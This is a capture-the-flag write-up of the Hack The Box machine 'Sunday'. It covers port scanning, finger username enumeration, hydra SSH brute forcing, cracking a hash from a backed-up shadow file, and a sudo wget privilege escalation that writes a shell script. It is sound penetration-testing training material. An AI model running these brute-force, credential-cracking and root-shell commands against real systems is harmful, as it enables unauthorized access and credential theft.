---
icon: ubuntu
---

# Sunday - Easy

<figure><img src="../../.gitbook/assets/image (3391).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/sunday"><strong>Sunday</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scaning & Enumeration</mark>

{% code title="Nmap TCP Scan" overflow="wrap" expandable="true" %}
```shellscript
nmap -A -p- -Pn 10.129.12.59 -oN scans/nmap-tcpall --min-rate 10000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 09:18 -0400
Warning: 10.129.12.59 giving up on port because retransmission cap hit (10).                                                                        
Nmap scan report for 10.129.12.59                                                                                                                   
Host is up (0.041s latency).                                                                                                                        
Not shown: 62612 filtered tcp ports (no-response), 2918 closed tcp ports (reset)                                                                    
PORT      STATE SERVICE VERSION                                                                                                                     
79/tcp    open  finger?                                                                                                                             
| fingerprint-strings:                                                                                                                              
|   GenericLines:                                                                                                                                   
|     No one logged on                                                                                                                              
|   GetRequest:                                                                                                                                     
|     Login Name TTY Idle When Where                                                                                                                
|     HTTP/1.0 ???                                                                                                                                  
|   HTTPOptions:                                                                                                                                    
|     Login Name TTY Idle When Where                                                                                                                
|     HTTP/1.0 ???                                                                                                                                  
|     OPTIONS ???                                                                                                                                   
|   Help:                                                                                                                                           
|     Login Name TTY Idle When Where                                                                                                                
|     HELP ???                                                                                                                                      
|   RTSPRequest:                                                                                                                                    
|     Login Name TTY Idle When Where                                                                                                                
|     OPTIONS ???                                                                                                                                   
|     RTSP/1.0 ???                                                                                                                                  
|   SSLSessionReq, TerminalServerCookie:                                                                                                            
|_    Login Name TTY Idle When Where                                                                                                                
|_finger: No one logged on\x0D                                                                                                                      
111/tcp   open  rpcbind 2-4 (RPC #100000)                                                                                                           
515/tcp   open  printer                                                                                                                             
6787/tcp  open  http    Apache httpd                                                                                                                
|_http-title: 400 Bad Request                                                                                                                       
|_http-server-header: Apache                                                                                                                        
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)                                                                                                  
| ssh-hostkey:                                                                                                                                      
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)                                                                                      
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)                                                                                   
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                            
SF-Port79-TCP:V=7.98%I=7%D=3/25%Time=69C3E110%P=x86_64-pc-linux-gnu%r(Gene                                                                          
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20                                                                          
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2                                                                          
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20                                                                          
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x                                                                          
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SS
SF:LSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\
SF:x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20
SF:\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/25%OT=79%CT=12%CU=31872%PV=Y%DS=2%DC=T%G=Y%TM=69C3E1
OS:7E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%TS=7)SEQ(SP=103%GCD=1%ISR=10E%TI=I
OS:%CI=I%II=I%SS=S%TS=7)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)S
OS:EQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=ST11M542NW2%O2=S
OS:T11M542NW2%O3=NNT11M542NW2%O4=ST11M542NW2%O5=ST11M542NW2%O6=ST11M542)WIN
OS:(W1=FA20%W2=FA20%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF7)ECN(R=Y%DF=Y%T=3C%W=FB0
OS:F%O=M542NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
OS:R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M542NW2%RD=0%Q=)T4(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%I
OS:PL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=Y%T=FF%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   90.93 ms 10.10.16.1
2   30.03 ms 10.129.12.59
```
{% endcode %}

### <mark style="color:blue;">Port 79 TCP - Finger</mark>&#x20;

I am going to try and brute force the port for some usernames using `finger-user-enum.pl`

{% embed url="https://github.com/pentestmonkey/finger-user-enum" %}

#### <mark style="color:$primary;">Brute Force</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
./finger-user-enum.pl -U ~/tools/SecLists/Usernames/Names/names.txt -t 10.129.12.59
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3392).png" alt=""><figcaption></figcaption></figure>

Alright we got a list of usernames, and considering the box's name two stand out. I am going to try and Brute Force SSH

### <mark style="color:blue;">Brute Force SSH</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
hydra -l sunny -P /usr/share/wordlists/rockyou.txt -s 22022 ssh://10.129.12.59
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3393).png" alt=""><figcaption></figcaption></figure>

We got a match for sunny

{% code overflow="wrap" expandable="true" %}
```shellscript
sunny:sunday
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3394).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as sunny</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3395).png" alt=""><figcaption></figcaption></figure>

During Manual enumeration I discovered a backup folder in `/` the folder contains a backup of `/etc/shadow`. I am going to try and crack Sammy's hash

### <mark style="color:blue;">Crack Sammy hash</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
john sammy.hash -w=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3396).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```shellscript
sammy:cooldude!
```
{% endcode %}

{% code overflow="wrap" expandable="true" %}
```shellscript
netexec ssh 10.129.12.59 -u sammy -p 'cooldude!' --port 22022
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3397).png" alt=""><figcaption></figcaption></figure>

SSH login confirmed. Nothing has changed since the backup!

### <mark style="color:blue;">Shell as sammy</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3398).png" alt=""><figcaption></figcaption></figure>

Sammy can run wget as the root user!

### <mark style="color:blue;">Sudo Wget -> GTFOBins Privesc</mark>

{% embed url="https://gtfobins.org/gtfobins/wget/#shell" %}

<figure><img src="../../.gitbook/assets/image (3399).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```shellscript
echo -e '#!/bin/sh\n/bin/sh 1>&0' > shell
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3400).png" alt=""><figcaption></figcaption></figure>
